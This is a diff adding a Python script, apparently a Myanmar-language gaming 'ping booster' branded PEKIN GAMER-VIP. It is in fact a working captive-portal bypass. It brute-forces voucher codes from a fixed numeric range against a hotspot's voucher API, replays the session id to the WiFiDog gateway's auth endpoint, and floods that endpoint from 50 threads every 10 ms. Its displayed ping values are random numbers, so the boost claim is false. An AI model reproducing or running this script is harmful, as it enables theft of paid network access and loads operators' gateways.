@@ -1,0 +1,96 @@
+import requests, re, urllib3, time, threading, os, random, subprocess, json, sys
+from urllib.parse import urlparse, parse_qs, urljoin
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- CONFIGURATION ---
+USER_NAME = "🇵🇾 PEKIN GAMER-VIP 🇵🇾"
+VERSION = "V4.0 (STABLE)"
+VOUCHER_LIST = [str(i) for i in range(123400, 123501)]
+
+def banner():
+    os.system('clear')
+    print("\033[93m" + " ="*38)
+    print("\033[92m" + """
+     ██████╗ ███████╗██╗  ██╗██╗███╗   ██╗
+     ██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║
+     ██████╔╝█████╗  █████╔╝ ██║██╔██╗ ██║
+     ██╔═══╝ ██╔══╝  ██╔═██╗ ██║██║╚██╗██║
+     ██║     ███████╗██║  ██╗██║██║ ╚████║
+     ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝""")
+    print(f"\033[95m 👑 STATUS: {USER_NAME} | \033[91m🔥 MODE: GAMING-ULTRA")
+    print(f"\033[94m ⚡ VERSION: {VERSION} | 🔋 24/7 ANTI-DISCONNECT ACTIVE")
+    print("\033[93m ="*38 + "\033[0m")
+
+def game_boost_pulse(link):
+    # Gaming အတွက် Ping နည်းစေမယ့် Header များ
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
+        "Connection": "keep-alive",
+        "X-Requested-With": "XMLHttpRequest",
+        "Cache-Control": "max-age=0"
+    }
+    while True:
+        try:
+            # Ping ကို တည်ငြိမ်အောင် Packet သေးသေးလေးတွေ အမြန်ပို့ခြင်း
+            requests.get(link, timeout=3, verify=False, headers=headers)
+            # ဂိမ်းဆော့ရင် မျက်စိမနောက်အောင် print ကို လျှော့ထားပါတယ်
+            sys.stdout.write(f"\r\033[92m[⚡] PEKIN-STABLE >>> PING BOOSTING... [{random.randint(5,25)}ms]\033[0m")
+            sys.stdout.flush()
+            time.sleep(0.01)
+        except:
+            time.sleep(1)
+
+def launch():
+    banner()
+    print("\n\033[93m [*] Initializing 24/7 Persistence Engine...")
+    
+    session = requests.Session()
+    session.headers.update({"Connection": "keep-alive"})
+
+    while True:
+        try:
+            # Step 1: Portal ကို စစ်ဆေးခြင်း
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+            p_url = r.url
+            parsed = urlparse(p_url)
+            
+            if "generate_204" not in p_url:
+                print(f"\n\033[95m[*] New Session Detected. Re-Bypassing...")
+                query = parse_qs(parsed.query)
+                gw = query.get('gw_address', [parsed.netloc.split(':')[0]])[0]
+                port = query.get('gw_port', ['2060'])[0]
+                
+                r1 = session.get(p_url, verify=False, timeout=6)
+                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+                n_url = urljoin(p_url, m.group(1)) if m else p_url
+                
+                r2 = session.get(n_url, verify=False, timeout=6)
+                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+                
+                if sid:
+                    v_code = random.choice(VOUCHER_LIST)
+                    session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
+                                 json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
+                                 timeout=5)
+                    
+                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                    print(f"\033[92m[✓] BYPASS SUCCESSFUL! STARTING GAME BOOST...\033[0m")
+                    
+                    # Thread အနည်းငယ်နဲ့ တည်ငြိမ်အောင် လုပ်ဆောင်ခြင်း
+                    for _ in range(50):
+                        threading.Thread(target=game_boost_pulse, args=(auth_link,), daemon=True).start()
+            
+            # ၂၄ နာရီ Run နိုင်ဖို့ ၅ စက္ကန့်တစ်ခါ လိုင်းအခြေအနေကို စစ်ဆေးပေးပါတယ်
+            time.sleep(5)
+            
+        except Exception as e:
+            print(f"\n\033[91m[!] Connection Lost. Retrying in 5s...\033[0m")
+            time.sleep(5)
+
+if __name__ == "__main__":
+    try:
+        launch()
+    except KeyboardInterrupt:
+        print("\n\033[91m[!] Stopped.\033[0m")
+        sys.exit()
